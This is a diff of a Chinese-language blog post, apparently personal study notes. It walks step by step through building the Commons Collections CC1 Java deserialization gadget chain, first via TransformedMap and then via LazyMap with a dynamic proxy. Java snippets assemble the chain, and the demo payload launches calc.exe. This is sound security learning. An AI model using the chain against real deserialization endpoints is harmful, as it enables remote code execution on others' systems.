-<p>我们现在已经找到了危险方法InvokerTransformer.transform，我们接着往回找谁调用了transform方法，直接查找用法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221550.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>当然，三十几个调用，为了节省时间我们直接进入Map类里吧<br>我们可以看到TransformedMap中的CheckSetValue方法里调用了valueTransformer的transform方法<br>我们去瞅瞅valueTransformer是什么<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221846.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现是可控的参数，于是我们可以尝试控制valueTransformer来控制我们跳转到invokeTransformer中去进行任意方法执行，但别忘了，它是一个protected方法，我们需要看看哪里调用了这个protected方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222100.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>最后我们找到了这个方法<br>所以我们可以通过调用这个方法来控制TransformedMap进而控制valueTransformer再进行任意方法执行<br>我们只需要这样子写</p>
+<p>我们现在已经找到了危险方法InvokerTransformer.transform，我们接着往回找谁调用了transform方法，直接查找用法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221550.png" alt="image.png"><br>当然，三十几个调用，为了节省时间我们直接进入Map类里吧<br>我们可以看到TransformedMap中的CheckSetValue方法里调用了valueTransformer的transform方法<br>我们去瞅瞅valueTransformer是什么<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221846.png" alt="image.png"><br>发现是可控的参数，于是我们可以尝试控制valueTransformer来控制我们跳转到invokeTransformer中去进行任意方法执行，但别忘了，它是一个protected方法，我们需要看看哪里调用了这个protected方法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222100.png" alt="image.png"><br>最后我们找到了这个方法<br>所以我们可以通过调用这个方法来控制TransformedMap进而控制valueTransformer再进行任意方法执行<br>我们只需要这样子写</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">InvockerTransformer</span> <span class="hljs-operator">=</span> (InvokerTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);  <br>  <br>HashMap&lt;Object,Object&gt; map =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>  <br>TransformedMap.decorate(map,<span class="hljs-literal">null</span>,InvockerTransformer);<br></code></pre></td></tr></table></figure>
-<p>接下来我们继续向上找哪里调用了checkSetValue方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222705.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现了这处调用，而Entry的setValue是我们所熟悉的东西我们循环遍历这个Map，并且调用它的setValue方法<br>那我们只需要这样即可利用</p>
+<p>接下来我们继续向上找哪里调用了checkSetValue方法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222705.png" alt="image.png"><br>发现了这处调用，而Entry的setValue是我们所熟悉的东西我们循环遍历这个Map，并且调用它的setValue方法<br>那我们只需要这样即可利用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  </span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br><span class="hljs-comment">//        Class  c = Runtime.class;  </span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);  </span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc.exe&quot;);  </span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">InvockerTransformer</span> <span class="hljs-operator">=</span> (InvokerTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);  <br>  <br>        HashMap&lt;Object,Object&gt; map =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br>  <br>        Map&lt;Object,Object&gt; transormedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,InvockerTransformer);  <br>        <span class="hljs-keyword">for</span>(Map.Entry entry:transormedMap.entrySet())&#123;  <br>            entry.setValue(r);  <br>        &#125;  <br>    &#125;<br></code></pre></td></tr></table></figure>
-<p>接下来我们看看谁调用了setValue方法<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224004.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们发现直接有一个readObject方法调用了setValue方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224101.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>可以看清它是在遍历Map<br>我们看它的名字就知道它是动态代理那一水儿的东西<br>我们接下来看看这个Map是不是我们可控的<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224618.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们发现它就直接在构造函数里写着，那纯纯可控<br>那我们直接把我们刚写好的TransformedMap丢进去就行<br>但是我们看到这个类不是public，那default类型只能在相同包下才能访问，所以我们只能用反射了）</p>
+<p>接下来我们看看谁调用了setValue方法<img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224004.png" alt="image.png"><br>我们发现直接有一个readObject方法调用了setValue方法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224101.png" alt="image.png"><br>可以看清它是在遍历Map<br>我们看它的名字就知道它是动态代理那一水儿的东西<br>我们接下来看看这个Map是不是我们可控的<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224618.png" alt="image.png"><br>我们发现它就直接在构造函数里写着，那纯纯可控<br>那我们直接把我们刚写好的TransformedMap丢进去就行<br>但是我们看到这个类不是public，那default类型只能在相同包下才能访问，所以我们只能用反射了）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);  <br>annotationInvocationHandlerConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span>  annotationInvocationHandlerConstructor.newInstance(Override.class,transormedMap);<br></code></pre></td></tr></table></figure>
-<p>但目前有一个问题就是Runtime对象没办法序列化，因为它没有继承序列化接口<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225433.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们可以用反射来解决这个问题，它自己没办法实例化，那它的class呢<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225621.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>结果是显然的<br>那么我们可以这样写</p>
+<p>但目前有一个问题就是Runtime对象没办法序列化，因为它没有继承序列化接口<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225433.png" alt="image.png"><br>我们可以用反射来解决这个问题，它自己没办法实例化，那它的class呢<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225621.png" alt="image.png"><br>结果是显然的<br>那么我们可以这样写</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);  <br> <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>(Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);  <br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);  <br> execMethod.invoke(r,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure>
 <p>但是我们需要写成这样才可以利用到这个循环</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">InvockerTransformer</span> <span class="hljs-operator">=</span> (InvokerTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure>
@@ -360,371 +148,64 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span>(Method)  <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);  <br>  <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);  <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure>
 
 
-<p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231551.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>嗯，宣，这里这个InvokerTransformer真的调的人头晕）<br>这样Runtime就可以序列化了，而且这个是很符合我们之前看到了chainedTransformer，前一个的输出给后一个用，我们甚至可以设想用chainedtransformer来进行这一串<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231857.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们只需要把想调用的方法写在一个数组里就可以让chainedTransformer进行链式调用<br>也就是将代码写成这样</p>
+<p><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231551.png" alt="image.png"><br>嗯，宣，这里这个InvokerTransformer真的调的人头晕）<br>这样Runtime就可以序列化了，而且这个是很符合我们之前看到了chainedTransformer，前一个的输出给后一个用，我们甚至可以设想用chainedtransformer来进行这一串<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231857.png" alt="image.png"><br>我们只需要把想调用的方法写在一个数组里就可以让chainedTransformer进行链式调用<br>也就是将代码写成这样</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)  <br>&#125;;  <br>ChainedTransformer chainedTransformer=(ChainedTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure>
-<p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232547.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p>嗯，宣<br>接下来我们解开之前的注释<br>我们还需要把之前这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232652.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>改成chainedTransformer<br>但到现在我发现并不能执行<br>一步一步调试(no) 看别人找原因(yes)后发现问题在这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204233752.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>通过源码我们可以看到(虽然我这里没截到)我们要调用的方法在这个if里，但是就目前来看我们这里的memberType是null，也就是进不去这个if，那我们要怎么办嘞，改！<br>它在这里<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234017.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>获取它的type并查找，所以我们在这里不能用Override了，得重新想个办法（抄个方法）也就是找一个有成员方法的东西，而且因为它是根据数组中的key来查找它的成员方法，所以我们还要将key改名为它的成员方法名字<br>所以我们看到了target<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234256.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>没错就是这个target<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234318.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p>它是有成员方法的<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234437.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>经过更改后我们发现它不是null了，那也就代表我们可以进去这个if了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234506.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>是这样嘟，进去咯<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234553.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>到了我们想调用的方法了，如果这里可控制，那么我们就成功了<br>我们步入<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234710.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现是chainedTransformer没错倒是，但是value错了，在这里的<code>valueTransformer.transform(value);</code>就相当于我们刚才代码里的<code>chainedTransformer.transform(Runtime.class);</code><br>所以这里的value应该是Runtime.class而不是现在程序里的那个值，草<br>继续看别人的，发现他们找到了一个叫做constantTransformer的东西，功能和他的名字一样就是传什么返回什么，那即使它这里改了我们的value，如果我们在chainedTransformer的开头调用这个constantTransformer，它到我们现在写的这个数组的开头<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235207.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这里的输出是一定的，所以我们只需要在这个数组前调用constantTransformer就可以了，最后的数组如下<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235306.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232547.png" alt="image.png"></p>
+<p>嗯，宣<br>接下来我们解开之前的注释<br>我们还需要把之前这里<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232652.png" alt="image.png"><br>改成chainedTransformer<br>但到现在我发现并不能执行<br>一步一步调试(no) 看别人找原因(yes)后发现问题在这里<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204233752.png" alt="image.png"><br>通过源码我们可以看到(虽然我这里没截到)我们要调用的方法在这个if里，但是就目前来看我们这里的memberType是null，也就是进不去这个if，那我们要怎么办嘞，改！<br>它在这里<img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234017.png" alt="image.png"><br>获取它的type并查找，所以我们在这里不能用Override了，得重新想个办法（抄个方法）也就是找一个有成员方法的东西，而且因为它是根据数组中的key来查找它的成员方法，所以我们还要将key改名为它的成员方法名字<br>所以我们看到了target<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234256.png" alt="image.png"><br>没错就是这个target<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234318.png" alt="image.png"></p>
+<p>它是有成员方法的<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234437.png" alt="image.png"><br>经过更改后我们发现它不是null了，那也就代表我们可以进去这个if了<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234506.png" alt="image.png"><br>是这样嘟，进去咯<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234553.png" alt="image.png"><br>到了我们想调用的方法了，如果这里可控制，那么我们就成功了<br>我们步入<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234710.png" alt="image.png"><br>发现是chainedTransformer没错倒是，但是value错了，在这里的<code>valueTransformer.transform(value);</code>就相当于我们刚才代码里的<code>chainedTransformer.transform(Runtime.class);</code><br>所以这里的value应该是Runtime.class而不是现在程序里的那个值，草<br>继续看别人的，发现他们找到了一个叫做constantTransformer的东西，功能和他的名字一样就是传什么返回什么，那即使它这里改了我们的value，如果我们在chainedTransformer的开头调用这个constantTransformer，它到我们现在写的这个数组的开头<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235207.png" alt="image.png"><br>这里的输出是一定的，所以我们只需要在这个数组前调用constantTransformer就可以了，最后的数组如下<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235306.png" alt="image.png"></p>
 <p>这样我们就可以做到了，我们尝试运行</p>
-<p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235351.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>嗯，宣，成功力<br>进行一个庆祝，CC1应该还差一个LazyMap没调，明天一定）</p>
-<h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>这二者之间的不同是来自于查找Transform方法调用的时候，也就是上一篇笔记的这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205155346.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>不止TransformedMap中有方法调用了transform，根据我当时的截图可以看到一共有三个Map中都有调用，我们这里要走的就是另外一条LazyMap这条链子<br>我们看到在这里，get方法调用了transform方法，这个不和上一个一样，找到这里发现直接是readObject调用，这里我们需要继续去查找谁调用了get，但是真的好多，查了一大堆<br>我们先看看它调用transform的这个factory是否可控，其实我们只需要传的时候传成chainedTransformer，并且能走到这个if里面就可以了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160201.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后直接看了yso，发现是<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160531.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>眼熟吧，很眼熟<br>我们直接去找这个类<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160712.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这俩忘记消掉的断点就知道了<br>我们跟着yso去瞅瞅它的invoke方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160902.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现这里调用了get方法而且根据昨天的调试我们知道这个membervalue是可控的，AnnotationInvocationHandler它属于一个动态代理，扒拉完之前的笔记<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161052.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>也就是说只要外面有方法调用，就会转发到invoke进行处理，也就是说这个我们可以类比于PHP中的魔术方法了，自动调用的那种，像call但如像<br>所以我们需要先弄一个动态代理<br>还是得复习之前的笔记呜呜呜我好菜<br>我们看到yso发现他还是在用之前的readObject<br>那么我们先看看这个调用了get而且具有参数可控条件的invoke方法如何才可以成功调用<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161627.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>很明显，尽可能地不去调用equals方法，也不要参数类型的长度不等于0，emmmm直白点就是别调用readObject中的有参方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161920.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这不就是了喵<br>所以我们接下来开始写一下<br>鉴于chainedTransformer那里没变，我们只需要注释后面的就可以了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162305.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们发现LazyMap中有两个decorate方法，我们去调用后者，因为我们最后是要把chainedTransformer放进去的<br>接下来我们需要弄一个动态代理来实现它的invoke方法调用<br>其实这里我有点忘记了hhhh，翻翻笔记<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162805.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>找到了这个<br>因为我们要代理的是一个Map所以我们需要这样构造</p>
+<p><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235351.png" alt="image.png"><br>嗯，宣，成功力<br>进行一个庆祝，CC1应该还差一个LazyMap没调，明天一定）</p>
+<h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>这二者之间的不同是来自于查找Transform方法调用的时候，也就是上一篇笔记的这里<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205155346.png" alt="image.png"><br>不止TransformedMap中有方法调用了transform，根据我当时的截图可以看到一共有三个Map中都有调用，我们这里要走的就是另外一条LazyMap这条链子<br>我们看到在这里，get方法调用了transform方法，这个不和上一个一样，找到这里发现直接是readObject调用，这里我们需要继续去查找谁调用了get，但是真的好多，查了一大堆<br>我们先看看它调用transform的这个factory是否可控，其实我们只需要传的时候传成chainedTransformer，并且能走到这个if里面就可以了<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160201.png" alt="image.png"><br>然后直接看了yso，发现是<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160531.png" alt="image.png"><br>眼熟吧，很眼熟<br>我们直接去找这个类<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160712.png" alt="image.png"><br>这俩忘记消掉的断点就知道了<br>我们跟着yso去瞅瞅它的invoke方法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160902.png" alt="image.png"><br>发现这里调用了get方法而且根据昨天的调试我们知道这个membervalue是可控的，AnnotationInvocationHandler它属于一个动态代理，扒拉完之前的笔记<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161052.png" alt="image.png"><br>也就是说只要外面有方法调用，就会转发到invoke进行处理，也就是说这个我们可以类比于PHP中的魔术方法了，自动调用的那种，像call但如像<br>所以我们需要先弄一个动态代理<br>还是得复习之前的笔记呜呜呜我好菜<br>我们看到yso发现他还是在用之前的readObject<br>那么我们先看看这个调用了get而且具有参数可控条件的invoke方法如何才可以成功调用<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161627.png" alt="image.png"><br>很明显，尽可能地不去调用equals方法，也不要参数类型的长度不等于0，emmmm直白点就是别调用readObject中的有参方法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161920.png" alt="image.png"><br>这不就是了喵<br>所以我们接下来开始写一下<br>鉴于chainedTransformer那里没变，我们只需要注释后面的就可以了<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162305.png" alt="image.png"><br>我们发现LazyMap中有两个decorate方法，我们去调用后者，因为我们最后是要把chainedTransformer放进去的<br>接下来我们需要弄一个动态代理来实现它的invoke方法调用<br>其实这里我有点忘记了hhhh，翻翻笔记<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162805.png" alt="image.png"><br>找到了这个<br>因为我们要代理的是一个Map所以我们需要这样构造</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,lazymapInvocationHandler);<br></code></pre></td></tr></table></figure>
-<p>接下来因为我们还需要走到readObject中，所以我们再次使用上一个的最后一部分，记得这里的transformedMap要改成mapProxy了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163621.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>于是我们尝试运行<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163709.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>嗯，宣<br>最后代码如下</p>
